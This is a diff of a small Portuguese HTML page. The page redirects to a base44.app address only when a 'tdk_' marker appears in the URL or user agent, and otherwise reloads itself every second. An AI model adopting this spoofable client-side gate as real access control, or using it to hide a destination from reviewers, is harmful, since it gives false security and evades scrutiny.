@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -39,63 +40,48 @@ body{
 }
 
 @keyframes girar{
-    100%{
-        transform:rotate(360deg);
-    }
+
+100%{
+    transform:rotate(360deg);
+}
+
 }
 
 </style>
 
 </head>
 
+
 <body>
 
 
-<div id="container-seguro"></div>
+<div id="container"></div>
 
 
 <script>
 
 
-// Detecta ambiente
+const APP_NAME = "tdk_";
 
 let ua = navigator.userAgent.toLowerCase();
 
-let urlParams = new URLSearchParams(window.location.search);
+let params = new URLSearchParams(window.location.search);
 
-let appParam = urlParams.get("app") || "";
-
-
-// Identificação
-
-const APP_NAME = "tdk_";
+let app = params.get("app");
 
 
-// Detecta WebView Android
+// valida app
 
-let webview =
-ua.includes("wv") ||
-ua.includes("webview") ||
-ua.includes("android");
-
-
-// Detecta app por parâmetro
-
-let appDetectado =
-appParam === APP_NAME;
-
-
-// Permite se for WebView ou parâmetro
-
-let dentroDoApp =
-webview || appDetectado;
+let autorizado =
+app === APP_NAME ||
+ua.includes(APP_NAME);
 
 
 
-if(dentroDoApp){
+if(autorizado){
 
 
-document.getElementById("container-seguro").innerHTML = `
+document.getElementById("container").innerHTML = `
 
 <div class="box">
 
@@ -103,20 +89,16 @@ document.getElementById("container-seguro").innerHTML = `
 
 <h2>Verificando ambiente...</h2>
 
-<p>Aguarde...</p>
-
 </div>
 
 `;
 
 
+setTimeout(()=>{
 
-setTimeout(function(){
-
-
-window.location.href =
-"https://tdk000999.base44.app";
-
+window.location.replace(
+"https://tdk000999.base44.app"
+);
 
 },1500);
 
@@ -125,10 +107,17 @@ window.location.href =
 }else{
 
 
-document.getElementById("container-seguro").innerHTML="";
+// sem autorização
+
+setInterval(()=>{
+
+location.reload();
+
+},1000);
 
 
 }
+
 
 
 </script>
